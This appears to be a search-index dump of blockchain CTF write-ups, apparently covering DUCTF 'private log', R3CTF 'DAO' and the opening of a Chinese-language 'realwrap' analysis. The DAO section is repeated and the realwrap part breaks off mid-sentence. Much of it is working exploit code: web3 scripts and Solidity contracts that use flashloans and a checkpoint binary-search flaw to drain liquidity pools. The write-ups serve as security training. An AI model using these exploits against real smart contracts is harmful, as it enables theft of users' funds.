'data' ] . replace ( '41' * 31 , logEntry ) # \u53ef\u80fd\u5b58\u5728 UTF-8 \u65e0\u6cd5\u7f16\u7801\u7684\u5b57\u7b26\uff0c\u56e0\u6b64\u4e0d\u76f4\u63a5\u4f20\u5165 logEntry\uff0c\u800c\u662f\u91c7\u7528\u66ff\u6362\u7684\u65b9\u5f0f tx_hash = w3 . eth . send_raw_transaction ( account . sign_transaction ( tx ) . rawTransaction ) . hex () w3 . eth . wait_for_transaction_receipt ( tx_hash ) print ( w3 . eth . getStorageAt ( proxy_addr , _IMPLEMENTATION_SLOT ) . hex ()) curr_nonce = w3 . eth . get_transaction_count ( account . address ) while target_nonce > curr_nonce : transact ( \"contract_log.functions.createLogEntry('under the control', 'password', newHash)\" ) curr_nonce += 1 hack_source = \"\"\" // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; contract Hack { function steal() public { payable(msg.sender).transfer(100 ether); } } \"\"\" _ , hack_interface = compile_source ( hack_source ) . popitem () hack_contract = w3 . eth . contract ( abi = hack_interface [ 'abi' ], bytecode = hack_interface [ 'bin' ]) print ( transact ( \"hack_contract.constructor()\" , gas = hack_contract . constructor () . estimateGas () * 2 ) . contractAddress ) contract_hack = w3 . eth . contract ( address = proxy_addr , abi = hack_interface [ 'abi' ]) transact ( \"contract_hack.functions.steal()\" ) print ( requests . get ( f 'https://blockchain-privatelog- { base_id } .2022.ductf.dev/challenge/solve' ) . content )","title":"Exploit"},{"location":"blockchain/private_log/#flag","text":"DUCTF{first_i_steal_ur_tx_then_I_steal_ur_proxy_then_i_steal_ur_funds} ERC1967Upgrade - _IMPLEMENTATION_SLOT \u21a9","title":"Flag"},{"location":"blockchain/r3dao/","tags":["smart contract","checkpoint","binary search"],"text":"#smart contract #checkpoint #binary search .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 rug me pls Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; ... contract Deploy is CTFDeployment { function deploy ( address system , address player ) internal override returns ( address challenge ) { vm . startBroadcast ( player ); payable ( system ). transfer ( player . balance - 10 ether ); vm . stopBroadcast (); vm . startBroadcast ( system ); WETH9 weth = new WETH9 (); R3Token token = new R3Token (); R3Dao dao = new R3Dao ( token ); token . transferOwnership ( address ( 0 )); IUniswapV2Factory uniswapV2Factory = IUniswapV2Factory ( deployUniswapV2Factory () ); IUniswapV2Pair pair = IUniswapV2Pair ( uniswapV2Factory . createPair ( address ( token ), address ( weth )) ); token . transfer ( address ( pair ), 100 _000 ether ); weth . deposit { value : 500 ether }(); weth . transfer ( address ( pair ), 500 ether ); pair . mint ( address ( dao )); challenge = address ( new Challenge ( dao , pair , token , IERC20 ( address ( weth )))); vm . stopBroadcast (); } function deployUniswapV2Factory () internal returns ( address ) { // Bytecode from the mainnet deployment ... address addr ; assembly { addr := create ( 0 , add ( bytecode , 0x20 ), mload ( bytecode )) } return addr ; } } Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.20 ; import \"src/R3Dao.sol\" ; import \"src/IERC20.sol\" ; import \"v2-core/interfaces/IUniswapV2Pair.sol\" ; contract Challenge { R3Dao public immutable dao ; IUniswapV2Pair public immutable pair ; IERC20 public immutable token ; IERC20 public immutable weth ; constructor ( R3Dao _dao , IUniswapV2Pair _pair , IERC20 _token , IERC20 _weth ) { dao = _dao ; pair = _pair ; token = _token ; weth = _weth ; } function isSolved () external view returns ( bool ) { return address ( msg . sender ). balance > 500 ether ; } } R3Token.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.20 ; import \"./IERC20.sol\" ; contract R3Token is IERC20 { event Transfer ( address indexed from , address indexed to , uint256 value ); event Approval ( address indexed owner , address indexed spender , uint256 value ); uint256 public totalSupply ; mapping ( address => uint256 ) public balanceOf ; mapping ( address => mapping ( address => uint256 )) public allowance ; string public name ; string public symbol ; uint8 public decimals ; address public owner ; struct Checkpoint { uint256 fromBlock ; uint256 value ; } mapping ( address => Checkpoint []) public balanceCheckpoints ; modifier onlyOwner () { require ( msg . sender == owner , \"R3Token: not owner\" ); _ ; } function transferOwnership ( address newOwner ) external onlyOwner { owner = newOwner ; } constructor () { name = \"R3Token\" ; symbol = \"R3\" ; decimals = 18 ; owner = msg . sender ; //mint totalSupply = 1 _000_000 ether ; balanceOf [ msg . sender ] = totalSupply ; } function _transfer ( address from , address to , uint256 amount ) internal { balanceOf [ from ] -= amount ; balanceOf [ to ] += amount ; balanceCheckpoints [ from ]. push ( Checkpoint ( block . number , balanceOf [ from ])); balanceCheckpoints [ to ]. push ( Checkpoint ( block . number , balanceOf [ to ])); emit Transfer ( from , to , amount ); } function transfer ( address recipient , uint256 amount ) external returns ( bool ) { _transfer ( msg . sender , recipient , amount ); return true ; } function approve ( address spender , uint256 amount ) external returns ( bool ) { allowance [ msg . sender ][ spender ] = amount ; emit Approval ( msg . sender , spender , amount ); return true ; } function transferFrom ( address sender , address recipient , uint256 amount ) external returns ( bool ) { allowance [ sender ][ msg . sender ] -= amount ; _transfer ( sender , recipient , amount ); return true ; } function getPriorVotes ( address account , uint256 blockNumber ) external view returns ( uint256 ) { Checkpoint [] storage checkpoints = balanceCheckpoints [ account ]; if ( checkpoints . length == 0 || blockNumber < checkpoints [ 0 ]. fromBlock ) { return 0 ; } if ( blockNumber >= checkpoints [ checkpoints . length - 1 ]. fromBlock ) { return checkpoints [ checkpoints . length - 1 ]. value ; } uint256 min = 0 ; uint256 max = checkpoints . length - 1 ; while ( max > min ) { uint256 mid = ( max + min + 1 ) / 2 ; if ( checkpoints [ mid ]. fromBlock == blockNumber ) { return checkpoints [ mid ]. value ; } if ( checkpoints [ mid ]. fromBlock < blockNumber ) { min = mid ; } else { max = mid - 1 ; } } return checkpoints [ min ]. value ; } } R3Dao.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.20 ; import \"./R3Token.sol\" ; contract R3Dao { R3Token public token ; struct Proposal { address proposer ; address recipient ; bytes32 payloadHash ; uint256 votes ; uint256 beginBlock ; mapping ( address => bool ) voted ; bool executed ; } Proposal [] public proposals ; constructor ( R3Token _token ) { token = _token ; } function propose ( address recipient , bytes32 payloadHash ) external returns ( uint256 ) { uint256 proposalIndex = proposals . length ; proposals . push (); Proposal storage proposal = proposals [ proposalIndex ]; proposal . proposer = msg . sender ; proposal . recipient = recipient ; proposal . payloadHash = payloadHash ; proposal . beginBlock = block . number - 1 ; return proposalIndex ; } function vote ( uint256 proposalIndex ) external { Proposal storage proposal = proposals [ proposalIndex ]; require ( ! proposal . executed , \"R3Dao: proposal executed\" ); require ( ! proposal . voted [ msg . sender ], \"R3Dao: already voted\" ); uint power = token . getPriorVotes ( msg . sender , proposal . beginBlock ); require ( power > 0 , \"R3Dao: no voting power\" ); proposal . voted [ msg . sender ] = true ; proposal . votes += power ; } function execute ( uint256 proposalIndex , bytes calldata payload ) external { Proposal storage proposal = proposals [ proposalIndex ]; require ( ! proposal . executed , \"R3Dao: proposal executed\" ); require ( proposal . votes > token . totalSupply () / 2 , \"R3Dao: insufficient votes\" ); proposal . executed = true ; ( bool success , ) = proposal . recipient . delegatecall ( payload ); require ( success , \"R3Dao: call failed\" ); } } Solution \u00b6 To let the R3Dao execute a liquidity token transfer proposal, we need enough votes Each voter's vote is a cached balance of tokens he holds, handled by the function getPriorVotes . The state variable balanceCheckpoints records all changes to user balances In the function getPriorVotes , it will do a binary search on the balanceCheckpoints[account] if the block number of the last record is greater than the argument blockNumber . There may be multiple checkpoints with the same block number, but the search returns as soon as it encounters a checkpoint with the required block number Therefore, we can perform a flashloan, and add some redundant operations so that the binary search returns the desired checkpoint during the flashloan After receiving the liquidity tokens, we can burn them all in exchange for ether and solve the challenge Solve.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 contract Helper { function flashloan ( Challenge challenge ) external { IUniswapV2Pair pair = challenge . pair (); address token = address ( challenge . token ()); // redundant transfer // using tx.origin does not affect the checkpoints of the Hack IERC20 ( token ). transfer ( tx . origin , 0 ); uint bal = IERC20 ( token ). balanceOf ( address ( pair )) - 1 ; pair . swap ( pair . token0 () == token ? bal : 0 , pair . token1 () == token ? bal : 0 , address ( this ), abi . encode ( address ( challenge )) ); } function vote ( Challenge challenge ) external { R3Dao dao = challenge . dao (); challenge . token (). transfer ( tx . origin , 0 ); // redundant transfer dao . vote ( 0 ); } function uniswapV2Call ( address sender , uint a0 , uint a1 , bytes calldata data ) external { require ( sender == address ( this )); IERC20 token = Challenge ( abi . decode ( data , ( address ))). token (); token . transfer ( msg . sender , ( a0 > 0 ? a0 : a1 ) + 300 ether ); } } contract Hack { Challenge challenge ; UniswapV2Router router ; Helper [] helpers ; constructor ( Challenge _challenge ) { challenge = _challenge ; // If you use uniswapv2-solc0.8, don't forget to update // the init code hash in UniswapV2Library::pairFor() router = new UniswapV2Router ( _challenge . pair (). factory (), address ( _challenge . weth ()) ); } function swap () external payable { Challenge chal = challenge ; address [] memory path = new address []( 2 ); path [ 0 ] = address ( chal . weth ()); path [ 1 ] = address ( chal . token ()); router . swapExactETHForTokens { value : msg . value }( 0 , path , address ( this ), block . timestamp ); IERC20 token = IERC20 ( path [ 1 ]); for ( uint i ; i < 5 ; i ++ ) { Helper helper = new Helper (); token . transfer ( address ( helper ), 300 ether ); // swap fee helpers . push ( helper ); } } function flashloan () external { Challenge chal = challenge ; IUniswapV2Pair pair = chal . pair (); address token = address ( chal . token ()); for ( uint i ; i < 5 ; i ++ ) { helpers [ i ]. flashloan ( chal ); } uint bal = IERC20 ( token ). balanceOf ( address ( pair )) - 1 ; pair . swap ( pair . token0 () == token ? bal : 0 , pair . token1 () == token ? bal : 0 , address ( this ), new bytes ( 1 ) ); } function exploit () external { Challenge chal = challenge ; R3Dao dao = chal . dao (); dao . propose ( address ( this ), bytes32 ( 0 )); for ( uint i ; i < 5 ; i ++ ) { helpers [ i ]. vote ( chal ); } for ( uint i ; i < 4 ; i ++ ) { chal . token (). transfer ( tx . origin , 0 ); // redundant transfer } dao . vote ( 0 ); dao . execute ( 0 , abi . encodeCall ( this . lpTransfer , ( address ( challenge . pair ()), address ( this ) ))); IUniswapV2Pair pair = challenge . pair (); pair . transfer ( address ( pair ), pair . balanceOf ( address ( this ))); pair . burn ( address ( this )); WETH9 weth = WETH9 ( payable ( address ( challenge . weth ()))); weth . withdraw ( weth . balanceOf ( address ( this ))); payable ( msg . sender ). transfer ( address ( this ). balance ); } function uniswapV2Call ( address sender , uint a0 , uint a1 , bytes calldata ) external { require ( sender == address ( this )); IERC20 token = challenge . token (); token . transfer ( msg . sender , ( a0 > 0 ? a0 : a1 ) + 300 ether ); } function lpTransfer ( address token , address target ) public { IERC20 ( token ). transfer ( target , IERC20 ( token ). balanceOf ( address ( this ))); } receive () external payable {} } contract Solve is CTFSolver { function solve ( address challenge , address ) override internal { Challenge chal = Challenge ( challenge ); Hack hack = new Hack ( chal ); hack . swap { value : 9.2 ether }(); vm . roll ( block . number + 1 ); hack . flashloan (); vm . roll ( block . number + 1 ); hack . exploit (); require ( chal . isSolved ()); } } Flag \u00b6 R3CTF{PL2-RE7-gO-PERC3N7S-oR-WE-WILl-d0xX-y0u-416baaeca611}","title":"DAO"},{"location":"blockchain/r3dao/#description","text":"rug me pls Deploy.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.13 ; ... contract Deploy is CTFDeployment { function deploy ( address system , address player ) internal override returns ( address challenge ) { vm . startBroadcast ( player ); payable ( system ). transfer ( player . balance - 10 ether ); vm . stopBroadcast (); vm . startBroadcast ( system ); WETH9 weth = new WETH9 (); R3Token token = new R3Token (); R3Dao dao = new R3Dao ( token ); token . transferOwnership ( address ( 0 )); IUniswapV2Factory uniswapV2Factory = IUniswapV2Factory ( deployUniswapV2Factory () ); IUniswapV2Pair pair = IUniswapV2Pair ( uniswapV2Factory . createPair ( address ( token ), address ( weth )) ); token . transfer ( address ( pair ), 100 _000 ether ); weth . deposit { value : 500 ether }(); weth . transfer ( address ( pair ), 500 ether ); pair . mint ( address ( dao )); challenge = address ( new Challenge ( dao , pair , token , IERC20 ( address ( weth )))); vm . stopBroadcast (); } function deployUniswapV2Factory () internal returns ( address ) { // Bytecode from the mainnet deployment ... address addr ; assembly { addr := create ( 0 , add ( bytecode , 0x20 ), mload ( bytecode )) } return addr ; } } Challenge.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.20 ; import \"src/R3Dao.sol\" ; import \"src/IERC20.sol\" ; import \"v2-core/interfaces/IUniswapV2Pair.sol\" ; contract Challenge { R3Dao public immutable dao ; IUniswapV2Pair public immutable pair ; IERC20 public immutable token ; IERC20 public immutable weth ; constructor ( R3Dao _dao , IUniswapV2Pair _pair , IERC20 _token , IERC20 _weth ) { dao = _dao ; pair = _pair ; token = _token ; weth = _weth ; } function isSolved () external view returns ( bool ) { return address ( msg . sender ). balance > 500 ether ; } } R3Token.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.20 ; import \"./IERC20.sol\" ; contract R3Token is IERC20 { event Transfer ( address indexed from , address indexed to , uint256 value ); event Approval ( address indexed owner , address indexed spender , uint256 value ); uint256 public totalSupply ; mapping ( address => uint256 ) public balanceOf ; mapping ( address => mapping ( address => uint256 )) public allowance ; string public name ; string public symbol ; uint8 public decimals ; address public owner ; struct Checkpoint { uint256 fromBlock ; uint256 value ; } mapping ( address => Checkpoint []) public balanceCheckpoints ; modifier onlyOwner () { require ( msg . sender == owner , \"R3Token: not owner\" ); _ ; } function transferOwnership ( address newOwner ) external onlyOwner { owner = newOwner ; } constructor () { name = \"R3Token\" ; symbol = \"R3\" ; decimals = 18 ; owner = msg . sender ; //mint totalSupply = 1 _000_000 ether ; balanceOf [ msg . sender ] = totalSupply ; } function _transfer ( address from , address to , uint256 amount ) internal { balanceOf [ from ] -= amount ; balanceOf [ to ] += amount ; balanceCheckpoints [ from ]. push ( Checkpoint ( block . number , balanceOf [ from ])); balanceCheckpoints [ to ]. push ( Checkpoint ( block . number , balanceOf [ to ])); emit Transfer ( from , to , amount ); } function transfer ( address recipient , uint256 amount ) external returns ( bool ) { _transfer ( msg . sender , recipient , amount ); return true ; } function approve ( address spender , uint256 amount ) external returns ( bool ) { allowance [ msg . sender ][ spender ] = amount ; emit Approval ( msg . sender , spender , amount ); return true ; } function transferFrom ( address sender , address recipient , uint256 amount ) external returns ( bool ) { allowance [ sender ][ msg . sender ] -= amount ; _transfer ( sender , recipient , amount ); return true ; } function getPriorVotes ( address account , uint256 blockNumber ) external view returns ( uint256 ) { Checkpoint [] storage checkpoints = balanceCheckpoints [ account ]; if ( checkpoints . length == 0 || blockNumber < checkpoints [ 0 ]. fromBlock ) { return 0 ; } if ( blockNumber >= checkpoints [ checkpoints . length - 1 ]. fromBlock ) { return checkpoints [ checkpoints . length - 1 ]. value ; } uint256 min = 0 ; uint256 max = checkpoints . length - 1 ; while ( max > min ) { uint256 mid = ( max + min + 1 ) / 2 ; if ( checkpoints [ mid ]. fromBlock == blockNumber ) { return checkpoints [ mid ]. value ; } if ( checkpoints [ mid ]. fromBlock < blockNumber ) { min = mid ; } else { max = mid - 1 ; } } return checkpoints [ min ]. value ; } } R3Dao.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.20 ; import \"./R3Token.sol\" ; contract R3Dao { R3Token public token ; struct Proposal { address proposer ; address recipient ; bytes32 payloadHash ; uint256 votes ; uint256 beginBlock ; mapping ( address => bool ) voted ; bool executed ; } Proposal [] public proposals ; constructor ( R3Token _token ) { token = _token ; } function propose ( address recipient , bytes32 payloadHash ) external returns ( uint256 ) { uint256 proposalIndex = proposals . length ; proposals . push (); Proposal storage proposal = proposals [ proposalIndex ]; proposal . proposer = msg . sender ; proposal . recipient = recipient ; proposal . payloadHash = payloadHash ; proposal . beginBlock = block . number - 1 ; return proposalIndex ; } function vote ( uint256 proposalIndex ) external { Proposal storage proposal = proposals [ proposalIndex ]; require ( ! proposal . executed , \"R3Dao: proposal executed\" ); require ( ! proposal . voted [ msg . sender ], \"R3Dao: already voted\" ); uint power = token . getPriorVotes ( msg . sender , proposal . beginBlock ); require ( power > 0 , \"R3Dao: no voting power\" ); proposal . voted [ msg . sender ] = true ; proposal . votes += power ; } function execute ( uint256 proposalIndex , bytes calldata payload ) external { Proposal storage proposal = proposals [ proposalIndex ]; require ( ! proposal . executed , \"R3Dao: proposal executed\" ); require ( proposal . votes > token . totalSupply () / 2 , \"R3Dao: insufficient votes\" ); proposal . executed = true ; ( bool success , ) = proposal . recipient . delegatecall ( payload ); require ( success , \"R3Dao: call failed\" ); } }","title":"Description"},{"location":"blockchain/r3dao/#solution","text":"To let the R3Dao execute a liquidity token transfer proposal, we need enough votes Each voter's vote is a cached balance of tokens he holds, handled by the function getPriorVotes . The state variable balanceCheckpoints records all changes to user balances In the function getPriorVotes , it will do a binary search on the balanceCheckpoints[account] if the block number of the last record is greater than the argument blockNumber . There may be multiple checkpoints with the same block number, but the search returns as soon as it encounters a checkpoint with the required block number Therefore, we can perform a flashloan, and add some redundant operations so that the binary search returns the desired checkpoint during the flashloan After receiving the liquidity tokens, we can burn them all in exchange for ether and solve the challenge Solve.s.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 contract Helper { function flashloan ( Challenge challenge ) external { IUniswapV2Pair pair = challenge . pair (); address token = address ( challenge . token ()); // redundant transfer // using tx.origin does not affect the checkpoints of the Hack IERC20 ( token ). transfer ( tx . origin , 0 ); uint bal = IERC20 ( token ). balanceOf ( address ( pair )) - 1 ; pair . swap ( pair . token0 () == token ? bal : 0 , pair . token1 () == token ? bal : 0 , address ( this ), abi . encode ( address ( challenge )) ); } function vote ( Challenge challenge ) external { R3Dao dao = challenge . dao (); challenge . token (). transfer ( tx . origin , 0 ); // redundant transfer dao . vote ( 0 ); } function uniswapV2Call ( address sender , uint a0 , uint a1 , bytes calldata data ) external { require ( sender == address ( this )); IERC20 token = Challenge ( abi . decode ( data , ( address ))). token (); token . transfer ( msg . sender , ( a0 > 0 ? a0 : a1 ) + 300 ether ); } } contract Hack { Challenge challenge ; UniswapV2Router router ; Helper [] helpers ; constructor ( Challenge _challenge ) { challenge = _challenge ; // If you use uniswapv2-solc0.8, don't forget to update // the init code hash in UniswapV2Library::pairFor() router = new UniswapV2Router ( _challenge . pair (). factory (), address ( _challenge . weth ()) ); } function swap () external payable { Challenge chal = challenge ; address [] memory path = new address []( 2 ); path [ 0 ] = address ( chal . weth ()); path [ 1 ] = address ( chal . token ()); router . swapExactETHForTokens { value : msg . value }( 0 , path , address ( this ), block . timestamp ); IERC20 token = IERC20 ( path [ 1 ]); for ( uint i ; i < 5 ; i ++ ) { Helper helper = new Helper (); token . transfer ( address ( helper ), 300 ether ); // swap fee helpers . push ( helper ); } } function flashloan () external { Challenge chal = challenge ; IUniswapV2Pair pair = chal . pair (); address token = address ( chal . token ()); for ( uint i ; i < 5 ; i ++ ) { helpers [ i ]. flashloan ( chal ); } uint bal = IERC20 ( token ). balanceOf ( address ( pair )) - 1 ; pair . swap ( pair . token0 () == token ? bal : 0 , pair . token1 () == token ? bal : 0 , address ( this ), new bytes ( 1 ) ); } function exploit () external { Challenge chal = challenge ; R3Dao dao = chal . dao (); dao . propose ( address ( this ), bytes32 ( 0 )); for ( uint i ; i < 5 ; i ++ ) { helpers [ i ]. vote ( chal ); } for ( uint i ; i < 4 ; i ++ ) { chal . token (). transfer ( tx . origin , 0 ); // redundant transfer } dao . vote ( 0 ); dao . execute ( 0 , abi . encodeCall ( this . lpTransfer , ( address ( challenge . pair ()), address ( this ) ))); IUniswapV2Pair pair = challenge . pair (); pair . transfer ( address ( pair ), pair . balanceOf ( address ( this ))); pair . burn ( address ( this )); WETH9 weth = WETH9 ( payable ( address ( challenge . weth ()))); weth . withdraw ( weth . balanceOf ( address ( this ))); payable ( msg . sender ). transfer ( address ( this ). balance ); } function uniswapV2Call ( address sender , uint a0 , uint a1 , bytes calldata ) external { require ( sender == address ( this )); IERC20 token = challenge . token (); token . transfer ( msg . sender , ( a0 > 0 ? a0 : a1 ) + 300 ether ); } function lpTransfer ( address token , address target ) public { IERC20 ( token ). transfer ( target , IERC20 ( token ). balanceOf ( address ( this ))); } receive () external payable {} } contract Solve is CTFSolver { function solve ( address challenge , address ) override internal { Challenge chal = Challenge ( challenge ); Hack hack = new Hack ( chal ); hack . swap { value : 9.2 ether }(); vm . roll ( block . number + 1 ); hack . flashloan (); vm . roll ( block . number + 1 ); hack . exploit (); require ( chal . isSolved ()); } }","title":"Solution"},{"location":"blockchain/r3dao/#flag","text":"R3CTF{PL2-RE7-gO-PERC3N7S-oR-WE-WILl-d0xX-y0u-416baaeca611}","title":"Flag"},{"location":"blockchain/realwrap/","tags":["smart contract","precompiled contract","evm"],"text":"#smart contract #precompiled contract #evm .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 WETH on Ethereum is too cumbersome! I'll show you what is real Wrapped ETH by utilizing precompiled contract, it works like a charm especially when exchanging ETH in a swap pair. And most important, IT IS VERY SECURE! nc 47.254.91.104 20000 faucet: http://47.254.91.104:8080 RPC(geth v1.10.26 with realwrap patch): http://47.254.91.104:8545 realwrap.zip \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u5c06 UniswapV2Pair \u7684 reserve0 \u548c reserve1 \u6e05\u96f6\uff0c\u5373\u6e05\u7a7a\u5408\u7ea6 UniswapV2Pair \u6301\u6709\u7684 WETH \u548c SimpleToken \u5408\u7ea6 UniswapV2Pair \u4e2d\u7684\u51fd\u6570 swap \u5728\u53c2\u6570 data \u4e0d\u4e3a\u7a7a\u65f6\uff0c\u5c06\u8c03\u7528\u5916\u90e8\u5408\u7ea6\u7684\u51fd\u6570 uniswapV2Call \uff0c\u901a\u8fc7\u53c2\u6570 to \u63a7\u5236\uff0c\u51fd\u6570\u6267\u884c\u5185\u5bb9\u53ef\u81ea\u5b9a\u4e49 \u7531\u4e8e mint \u4e2d\u6c38\u4e45\u9501\u5b9a\u4e86\u4e00\u90e8\u5206\u8d44\u91d1\uff0c\u56e0\u6b64\u5408\u7ea6 UniswapV2Pair \u7684\u4f59\u989d\u59cb\u7ec8\u5c0f\u4e8e totalSupply \uff0c\u65e0\u6cd5\u901a\u8fc7 burn \u6e05\u7a7a\u4f59\u989d WETH \uff08Wrapped Ether\uff0c\u4ee5\u592a\u5e01\u64cd\u4f5c\u5957\u7528 ERC20 \u6807\u51c6\uff09 \u4e0e SimpleToken \u4e0d\u540c\uff0c\u5408\u7ea6\u5730\u5740\u662f\u56fa\u5b9a\u7684\uff0c\u5728\u5408\u7ea6 Factory \u4e2d\u6ca1\u6709\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\uff0c\u7528 web3.eth.getCode \u4e5f\u83b7\u53d6\u4e0d\u5230\u5408\u7ea6\u7684\u5b57\u8282\u7801 \u968f\u540e\u610f\u8bc6\u5230 WETH \u662f\u9884\u7f16\u8bd1\u5408\u7ea6\uff0c\u5e76\u6ce8\u610f\u5230\u4e86\u6587\u4ef6 geth_v1.10.26_precompiled.diff \u9884\u7f16\u8bd1\u5408\u7ea6\u7684\u8c03\u7528\u9700\u8981\u901a\u8fc7\u5185\u8054\u6c47\u7f16\uff0c\u4e0d\u8fc7\u672c\u9898\u5bf9\u9884\u7f16\u8bd1\u5408\u7ea6\u8fdb\u884c\u4e86\u5305\u88c5\uff08 contracts.go \uff09\uff0c\u56e0\u6b64 UniswapV2Pair \u4e2d\u8c03\u7528 WETH \u4e2d\u51fd\u6570\u7684\u65b9\u5f0f\u4e0e SimpleToken \u76f8\u540c \u63a5\u4e0b\u6765\u5206\u6790 contracts_weth.go \uff0c\u4e0e\u6807\u51c6\u7684 IERC20 \u4e0d\u540c\uff0c\u8fd8\u5b9e\u73b0\u4e86\u4e00\u4e2a transferAndCall \u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 functions = map [ string ] RunStatefulPrecompileFunc { calculateFunctionSelector ( \"name()\" ): metadata ( \"name\" ), calculateFunctionSelector ( \"symbol()\" ): metadata ( \"symbol\" ), calculateFunctionSelector ( \"decimals()\" ): metadata ( \"decimals\" ), calculateFunctionSelector ( \"balanceOf(address)\" ): balanceOf , calculateFunctionSelector ( \"transfer(address,uint256)\" ): transfer , calculateFunctionSelector ( \"transferAndCall(address,uint256,bytes)\" ): transferAndCall , calculateFunctionSelector ( \"allowance(address,address)\" ): allowance , calculateFunctionSelector ( \"approve(address,uint256)\" ): approve , calculateFunctionSelector ( \"transferFrom(address,address,uint256)\" ): transferFrom , } transferAndCall \u80fd\u591f\u5728\u8f6c\u8d26\u7684\u540c\u65f6\uff0c\u4ee5\u8bbe\u5b9a\u7684\u6570\u636e\uff08 inputArgs.Data \uff09\u8c03\u7528\u63a5\u6536\u8005\u5408\u7ea6 1 \u3002\u82e5\u80fd\u8ba9 UniswapV2Pair \u8c03\u7528 token \u7684 approve \u51fd\u6570\u5c31\u80fd\u591f\u6e05\u7a7a\u5408\u7ea6\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 func transferAndCall ( evm * EVM , caller common . Address , input [] byte , suppliedGas uint64 , readOnly bool ) ( ret [] byte , remainingGas uint64 , err error ) { if readOnly { return nil , suppliedGas , ErrWriteProtection } inputArgs := & TransferAndCallInput {} if err = unpackInputIntoInterface ( inputArgs , \"transferAndCall\" , input ); err != nil { return nil , suppliedGas , err } if ret , remainingGas , err = transferInternal ( evm , suppliedGas , caller , inputArgs . To , inputArgs . Amount ); err != nil { return ret , remainingGas , err } code := evm . StateDB . GetCode ( inputArgs . To ) if len ( code ) == 0 { return ret , remainingGas , nil } snapshot := evm . StateDB . Snapshot () evm . depth ++ defer func () { evm . depth -- }() if ret , remainingGas , err = evm . Call ( AccountRef ( caller ), inputArgs . To , inputArgs . Data , remainingGas , common . Big0 ); err != nil { evm . StateDB . RevertToSnapshot ( snapshot ) if err != ErrExecutionReverted { remainingGas = 0 } } return ret , remainingGas , err } \u82e5\u5728 uniswapV2Call \u4e2d\u76f4\u63a5\u4f7f\u7528 transferAndCall 